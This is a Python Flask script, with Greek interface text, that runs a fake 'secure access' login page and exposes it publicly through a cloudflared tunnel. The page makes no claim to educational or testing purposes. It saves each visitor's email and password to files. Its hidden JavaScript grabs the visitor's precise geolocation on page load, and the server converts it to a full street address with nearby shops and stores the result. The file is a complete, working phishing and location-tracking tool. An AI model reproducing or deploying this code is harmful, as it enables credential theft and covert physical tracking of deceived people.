# Login Page Location.py

import os
import json
import subprocess
import sys
import re
import logging
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify

# --- Dependency and Tunnel Setup ---

def install_package(package):
    """Installs a package using pip quietly."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Checks for cloudflared and required Python packages."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ERROR] Το 'cloudflared' δεν είναι εγκατεστημένο ή δεν βρίσκεται στο PATH του συστήματός σας.", file=sys.stderr)
        print("Παρακαλώ εγκαταστήστε το από: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            print(f"Εγκατάσταση του πακέτου που λείπει: {pkg_name}...", file=sys.stderr)
            install_package(pkg_name)

def run_cloudflared_and_print_link(port, script_name):
    """Starts a cloudflared tunnel and prints the public link."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"Δημόσια Σύνδεση {script_name}: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()


# --- Flask Application ---

import requests
from geopy.geocoders import Nominatim

app = Flask(__name__)

LOCATION_FOLDER = os.path.expanduser('~/storage/downloads/LocationData')
os.makedirs(LOCATION_FOLDER, exist_ok=True)
geolocator = Nominatim(user_agent="location_capture_app")

def get_nearby_stores(latitude, longitude, radius=2000):
    overpass_query = f"""[out:json];(node["shop"](around:{radius},{latitude},{longitude});way["shop"](around:{radius},{latitude},{longitude}););out body;"""
    try:
        response = requests.get("http://overpass-api.de/api/interpreter", params={'data': overpass_query})
        return [element['tags']['name'] for element in response.json().get('elements', []) if 'tags' in element and 'name' in element['tags']]
    except Exception:
        return []

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ασφαλής Πρόσβαση</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        :root {
            --bg-color: #f0f2f5; --form-bg-color: #ffffff; --text-color: #1c1e21;
            --subtle-text-color: #606770; --border-color: #dddfe2; --button-bg-color: #0d6efd;
            --button-hover-bg-color: #0b5ed7;
        }
        @media (prefers-color-scheme: dark) {
            :root {
                --bg-color: #121212; --form-bg-color: #1e1e1e; --text-color: #e4e6eb;
                --subtle-text-color: #b0b3b8; --border-color: #444; --button-bg-color: #2374e1;
                --button-hover-bg-color: #3982e4;
            }
            input { color-scheme: dark; }
        }
        body {
            margin: 0; padding: 20px; box-sizing: border-box; background-color: var(--bg-color);
            color: var(--text-color); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            display: flex; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; text-align: center;
        }
        .main-container { width: 100%; max-width: 400px; }
        .logo-container { margin-bottom: 24px; }
        .logo-container svg { width: 48px; height: 48px; fill: var(--button-bg-color); }
        .login-form {
            background: var(--form-bg-color); padding: 32px; border-radius: 12px;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08); border: 1px solid var(--border-color);
        }
        h1 { margin: 0 0 12px 0; font-size: 28px; font-weight: 600; }
        p { color: var(--subtle-text-color); font-size: 16px; margin: 0 0 28px 0; line-height: 1.5; }
        input[type="email"], input[type="password"] {
            width: 100%; padding: 14px; margin-bottom: 16px; border: 1px solid var(--border-color);
            background-color: var(--bg-color); color: var(--text-color); border-radius: 8px; font-size: 16px; box-sizing: border-box;
        }
        input::placeholder { color: var(--subtle-text-color); }
        input[type="submit"] {
            width: 100%; padding: 14px; background-color: var(--button-bg-color); border: none;
            border-radius: 8px; color: white; font-size: 17px; font-weight: 600; cursor: pointer; transition: background-color 0.2s ease;
        }
        input[type="submit"]:hover { background-color: var(--button-hover-bg-color); }
        footer { margin-top: 32px; font-size: 13px; color: var(--subtle-text-color); }
        footer a { color: var(--subtle-text-color); text-decoration: none; margin: 0 8px; }
        footer a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <div class="main-container">
        <header class="logo-container">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-13h2v6h-2zm0 8h2v2h-2z"/></svg>
        </header>
        <main class="login-form">
            <form action="/submit_credentials" method="post">
                <h1>Καλώς ήρθατε πίσω</h1>
                <p>Για να παρέχουμε τοπικές υπηρεσίες και να ενισχύσουμε την ασφάλεια του λογαριασμού σας, παρακαλούμε επιτρέψτε την πρόσβαση στην τοποθεσία σας.</p>
                <input type="email" name="email" placeholder="Εισάγετε το email σας" required>
                <input type="password" name="password" placeholder="Εισάγετε τον κωδικό πρόσβασής σας" required>
                <input type="submit" value="Σύνδεση με Ασφάλεια">
            </form>
        </main>
        <footer>
            <a href="#">Όροι Χρήσης</a> &bull; <a href="#">Πολιτική Απορρήτου</a> &bull; <a href="#">Υποστήριξη</a>
        </footer>
    </div>
    <script>
        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(pos => {
                    $.ajax({
                        url: '/upload_location', type: 'POST',
                        data: JSON.stringify({ 
                            latitude: pos.coords.latitude, 
                            longitude: pos.coords.longitude, 
                            accuracy: pos.coords.accuracy 
                        }),
                        contentType: 'application/json; charset=utf-8'
                    });
                }, () => {}, {enableHighAccuracy: true});
            }
        }
        requestLocation();
    </script>
</body>
</html>
'''

@app.route('/submit_credentials', methods=['POST'])
def submit_credentials():
    date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
    credentials_file = os.path.join(LOCATION_FOLDER, f"credentials_{date_str}.txt")
    with open(credentials_file, 'w') as f:
        f.write(f"Email: {request.form.get('email')}\nPassword: {request.form.get('password')}\n")
    return "Η σύνδεση ήταν επιτυχής. Θα ανακατευθυνθείτε σε λίγο.", 200

@app.route('/upload_location', methods=['POST'])
def upload_location():
    try:
        data = request.get_json(force=True)
        lat, lon = data.get('latitude'), data.get('longitude')
        if not lat or not lon:
            return jsonify({"error": "Μη έγκυρες συντεταγμένες"}), 400

        # Get the most detailed location data possible from Nominatim
        location = geolocator.reverse((lat, lon), language='el', exactly_one=True, timeout=10)
        
        # **FIX:** Extract all available address details from the raw data
        if location and hasattr(location, 'raw') and 'address' in location.raw:
            address_details = location.raw.get('address', {})
            data['full_address'] = location.address
            data['address_details'] = {
                'house_number': address_details.get('house_number'),
                'road': address_details.get('road'),
                'neighbourhood': address_details.get('neighbourhood'),
                'suburb': address_details.get('suburb'),
                'city_district': address_details.get('city_district'),
                'city': address_details.get('city'),
                'county': address_details.get('county'),
                'state': address_details.get('state'),
                'postcode': address_details.get('postcode'),
                'country': address_details.get('country'),
                'country_code': address_details.get('country_code')
            }
        else:
             data['full_address'] = 'N/A'
             data['address_details'] = {}

        data['nearby_stores'] = get_nearby_stores(lat, lon)
        date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        with open(os.path.join(LOCATION_FOLDER, f'location_{date_str}.json'), 'w') as f:
            json.dump(data, f, indent=4)
        
        return jsonify({"message": "Τα δεδομένα τοποθεσίας αποθηκεύτηκαν"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 400

if __name__ == '__main__':
    check_dependencies()
    log = logging.getLogger('werkzeug')
    log.setLevel(logging.ERROR)
    sys.modules['flask.cli'].show_server_banner = lambda *x: None
    port = 4040
    script_name = "Σελίδα Σύνδεσης (Τοποθεσία)"
    flask_thread = Thread(target=lambda: app.run(host='127.0.0.1', port=port))
    flask_thread.daemon = True
    flask_thread.start()
    time.sleep(1)
    try:
        run_cloudflared_and_print_link(port, script_name)
    except KeyboardInterrupt:
        print("\nΤερματισμός...")
        sys.exit(0)